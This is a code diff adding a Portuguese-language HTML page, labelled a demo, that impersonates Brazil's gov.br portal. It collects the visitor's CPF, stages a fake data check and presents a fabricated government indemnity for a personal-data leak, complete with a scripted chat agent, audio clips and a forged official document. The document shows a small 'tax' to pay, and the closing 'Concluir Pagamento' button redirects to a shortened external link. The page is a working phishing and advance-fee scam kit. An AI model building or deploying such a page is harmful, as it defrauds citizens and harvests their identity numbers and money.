@@ -1,0 +1,336 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Portal Gov Demo</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <main class="phone" aria-label="Portal demonstrativo">
+      <section id="homeScreen" class="screen home-screen">
+        <div class="status-bar">
+          <span>12:44</span>
+          <span class="dynamic-island"></span>
+          <span class="signal">|||</span>
+        </div>
+
+        <div class="home-hero">
+          <div class="yellow-band"></div>
+          <div class="portrait" aria-hidden="true"></div>
+          <div class="brand-area">
+            <div class="gov-logo" aria-label="gov.br">
+              <span class="blue">g</span><span class="yellow">o</span><span class="green">v</span><span class="blue">.br</span>
+            </div>
+            <p>
+              Uma <mark>conta gov.br</mark><br />
+              garante a identificacao<br />
+              de cada cidadao que acessa<br />
+              os servicos digitais do governo
+            </p>
+          </div>
+        </div>
+
+        <section class="welcome-card">
+          <h1>Bem-vindo - Portal Gov</h1>
+          <p class="subtitle">Processo Indenizatorio do Governo</p>
+          <p class="terms">
+            Ao entrar, voce concorda com nosso<br />
+            <a href="#">Termo de Responsabilidade</a> e
+            <a href="#">Politica de Privacidade</a>
+          </p>
+          <button id="enterButton" class="primary-button" type="button">Entrar em gov.br</button>
+        </section>
+
+        <div class="browser-chrome">
+          <div class="address-row">
+            <span>AA</span>
+            <span class="address">saldo-aprovado.github.io</span>
+            <span>↻</span>
+          </div>
+          <div class="nav-row">
+            <span>‹</span>
+            <span>›</span>
+            <span>⌑</span>
+            <span>□</span>
+            <span>▢</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="cpfScreen" class="screen cpf-screen hidden">
+        <div class="status-bar">
+          <span>12:44</span>
+          <span class="dynamic-island"></span>
+          <span class="signal">|||</span>
+        </div>
+
+        <header class="cpf-header">
+          <div class="gov-logo small-logo" aria-label="gov.br">
+            <span class="blue">g</span><span class="yellow">o</span><span class="green">v</span><span class="blue">br</span>
+          </div>
+        </header>
+
+        <form id="cpfForm" class="cpf-card">
+          <h2>Identifique-se no gov.br com:</h2>
+
+          <div class="cpf-option">
+            <span class="icon id-icon"></span>
+            <span>Numero do CPF</span>
+          </div>
+
+          <p class="helper">Digite seu CPF para consultar sua indenizacao</p>
+
+          <label>
+            CPF
+            <input id="cpfInput" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" autocomplete="off" />
+          </label>
+
+          <button class="primary-button continue-button" type="submit">Continuar</button>
+          <p id="formMessage" class="form-message" role="status"></p>
+
+          <div class="other-options">
+            <p>Outras opções de identificação:</p>
+            <button class="bank-login" type="button">
+              <img src="assets/icons/bank.png" alt="" />
+              <span>Login com seu banco</span>
+              <strong>Sua conta será prata</strong>
+            </button>
+            <button type="button">
+              <img src="assets/icons/qr.png" alt="" />
+              <span>Login com QR code</span>
+            </button>
+            <button type="button">
+              <img src="assets/icons/cert.png" alt="" />
+              <span>Seu certificado digital</span>
+            </button>
+            <button type="button">
+              <img src="assets/icons/cloud.png" alt="" />
+              <span>Seu certificado digital em nuvem</span>
+            </button>
+          </div>
+        </form>
+
+        <div class="browser-chrome">
+          <div class="address-row">
+            <span>AA</span>
+            <span class="address">saldo-aprovado.github.io</span>
+            <span>↻</span>
+          </div>
+          <div class="nav-row">
+            <span>‹</span>
+            <span>›</span>
+            <span>⌑</span>
+            <span>□</span>
+            <span>▢</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="transitionScreen" class="screen transition-screen hidden" aria-label="Tela de transicao">
+        <header class="transition-header">
+          <div class="gov-logo small-logo" aria-label="gov.br">
+            <span class="blue">g</span><span class="yellow">o</span><span class="green">v</span><span class="blue">br</span>
+          </div>
+        </header>
+
+        <div class="transition-content" role="status" aria-live="polite">
+          <div class="scan-card">
+            <div class="document-icon" aria-hidden="true">
+              <span></span>
+              <span></span>
+              <span></span>
+            </div>
+            <div class="scan-line" aria-hidden="true"></div>
+          </div>
+          <p class="transition-kicker">Aguarde</p>
+          <h2>Validando seus dados</h2>
+          <p>Estamos consultando as informações vinculadas ao CPF informado.</p>
+          <div class="transition-progress" aria-hidden="true">
+            <span></span>
+          </div>
+        </div>
+      </section>
+
+      <section id="resultScreen" class="screen result-screen hidden" aria-label="Resultado da consulta">
+        <header class="result-header">
+          <div class="gov-logo small-logo" aria-label="gov.br">
+            <span class="blue">g</span><span class="yellow">o</span><span class="green">v</span><span class="blue">br</span>
+          </div>
+        </header>
+
+        <section class="result-card">
+          <p class="result-message">
+            Sua indenização foi calculada com sucesso! O valor que você possui receber está abaixo do vídeo. Toque no botão
+            para realizar seu saque.
+          </p>
+
+          <div class="success-bar" aria-hidden="true"></div>
+
+          <div class="video-frame">
+            <video id="resultVideo" src="assets/videos/indenizacao.mp4" playsinline preload="metadata"></video>
+            <button id="listenButton" class="listen-button" type="button" aria-label="Clique para ouvir o vídeo">
+              <span class="listen-icon" aria-hidden="true"></span>
+              <span>Clique para Ouvir</span>
+            </button>
+          </div>
+
+          <div class="verified-data">
+            <h2>Dados verificados com sucesso!</h2>
+            <ul>
+              <li><img class="data-icon" src="assets/icons/verified-user.png" alt="" /><span id="verifiedName">Consultando</span></li>
+              <li><img class="data-icon" src="assets/icons/verified-document.png" alt="" /><span id="verifiedCpf">665.464.654-54</span></li>
+              <li><img class="data-icon" src="assets/icons/verified-calendar.png" alt="" /><span id="verifiedBirthDate">Consultando</span></li>
+              <li><img class="data-icon" src="assets/icons/verified-person.png" alt="" /><span>Não Informado</span></li>
+              <li class="amount-row"><img class="data-icon" src="assets/icons/verified-money.png" alt="" /><span id="amountStatus">Finalizando análise dos dados...</span><span id="amountSpinner" class="mini-spinner" aria-hidden="true"></span></li>
+            </ul>
+            <button id="receiveButton" class="receive-button hidden" type="button">Quero Receber Minha indenizacao</button>
+          </div>
+        </section>
+      </section>
+
+      <section id="chatScreen" class="screen chat-screen hidden" aria-label="Atendimento por chat">
+        <header class="chat-header">
+          <div class="chat-brand">
+            <img class="chat-avatar" src="assets/images/thalia-santos.jpg" alt="Thalia Santos">
+            <div>
+              <strong>Thalia Santos</strong>
+              <span>Online agora</span>
+            </div>
+          </div>
+        </header>
+
+        <div id="chatMessages" class="chat-messages">
+          <div class="chat-bubble bot chat-step">
+            Olá, <strong id="chatUserName">cidadão</strong>. Seu atendimento para liberação da indenização foi iniciado.
+          </div>
+
+          <div class="chat-bubble bot chat-step">
+            Antes de prosseguir, vou explicar rapidamente como o valor foi localizado no sistema.
+          </div>
+
+          <div class="audio-bubble bot chat-step" style="--audio-duration: 7s">
+            <button class="audio-play" type="button" aria-label="Reproduzir áudio">▶</button>
+            <audio src="assets/audios/audio-7s.mp3" preload="metadata"></audio>
+            <div class="audio-wave" aria-hidden="true">
+              <span></span><span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <span class="audio-time">0:07</span>
+          </div>
+
+          <div class="chat-bubble bot chat-step">
+            Localizamos o documento de conferência com os dados vinculados ao seu CPF.
+          </div>
+
+          <div class="chat-bubble bot chat-step">
+            Nesta etapa vamos usar apenas as informações já validadas na consulta anterior.
+          </div>
+
+          <div class="audio-bubble bot chat-step" style="--audio-duration: 22s">
+            <button class="audio-play" type="button" aria-label="Reproduzir áudio">▶</button>
+            <audio src="assets/audios/audio-22s.mp3" preload="metadata"></audio>
+            <div class="audio-wave" aria-hidden="true">
+              <span></span><span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <span class="audio-time">0:22</span>
+          </div>
+
+          <div class="chat-bubble bot chat-step">
+            Estou gerando a prévia do documento para você conferir o nome, o CPF e os valores.
+          </div>
+
+          <article class="mini-document chat-step" aria-label="Documento de indenização">
+            <div class="document-top">
+              <div class="gov-logo document-logo" aria-label="gov.br">
+                <span class="blue">g</span><span class="yellow">o</span><span class="green">v</span><span class="blue">br</span>
+              </div>
+              <h2>Indenização<br />Governamental</h2>
+            </div>
+
+            <div class="doc-field wide">
+              <span>Nome Completo</span>
+              <strong id="docName">Maria Vital</strong>
+            </div>
+
+            <div class="doc-grid">
+              <div class="doc-field">
+                <span>Indenização a Receber</span>
+                <strong>R$ 5.960,50</strong>
+              </div>
+              <div class="doc-field">
+                <span>Data de Emissão</span>
+                <strong id="docDate">05/06/2026</strong>
+              </div>
+              <div class="doc-field">
+                <span>Número do Documento</span>
+                <strong id="docNumber">03.40.37412.95828945-0</strong>
+              </div>
+              <div class="doc-field green">
+                <span>Vencimento</span>
+                <strong>05/06/2026</strong>
+              </div>
+            </div>
+
+            <div class="doc-grid two">
+              <div class="doc-field">
+                <span>Indenização a Receber</span>
+                <strong>Vazamento de Dados Pessoais</strong>
+              </div>
+              <div class="doc-field green">
+                <span>Taxa de Imposto</span>
+                <strong>R$ 61,90</strong>
+              </div>
+            </div>
+
+            <div class="leak-table">
+              <h3>Informação dos Dados Vazados</h3>
+              <table>
+                <thead>
+                  <tr><th>Código</th><th>Dado Pessoal</th><th>Multa</th><th>Juros</th></tr>
+                </thead>
+                <tbody>
+                  <tr><td>1887</td><td>NOME COMPLETO</td><td>690,40</td><td>202,25</td></tr>
+                  <tr><td>1888</td><td>CPF</td><td>489,35</td><td>515,90</td></tr>
+                  <tr><td>1889</td><td>RG</td><td>735,10</td><td>152,40</td></tr>
+                  <tr><td>1890</td><td>RENDA MENSAL</td><td>450,95</td><td>289,20</td></tr>
+                  <tr><td>1891</td><td>DADOS BANCÁRIOS</td><td>1.290,40</td><td>902,25</td></tr>
+                  <tr><td>1892</td><td>TELEFONE</td><td>135,45</td><td>106,85</td></tr>
+                </tbody>
+                <tfoot>
+                  <tr><td></td><td>Totais</td><td></td><td>R$ 5.960,50</td></tr>
+                </tfoot>
+              </table>
+            </div>
+          </article>
+
+          <div class="chat-bubble bot chat-step">
+            Documento gerado com sucesso. Confira se as informações exibidas estão corretas.
+          </div>
+
+          <div class="audio-bubble bot chat-step" style="--audio-duration: 37s">
+            <button class="audio-play" type="button" aria-label="Reproduzir áudio">▶</button>
+            <audio src="assets/audios/audio-37s.mp3" preload="metadata"></audio>
+            <div class="audio-wave" aria-hidden="true">
+              <span></span><span></span><span></span><span></span><span></span><span></span>
+            </div>
+            <span class="audio-time">0:37</span>
+          </div>
+
+          <div class="chat-bubble bot chat-step">
+            Após ouvir a orientação, siga para a próxima etapa para finalizar a liberação da indenização.
+          </div>
+          <button
+            class="chat-step"
+            type="button"
+            onclick="window.location.href='https://encurtador.com.br/gyYd'"
+            style="width: 100%; padding: 14px 18px; border: 0; border-radius: 18px; background: #236db7; color: #fff; font-size: 16px; font-weight: 800; line-height: 1.25; cursor: pointer;"
+          >
+            Concluir Pagamento
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <script src="app.js"></script>
+  </body>
+</html>
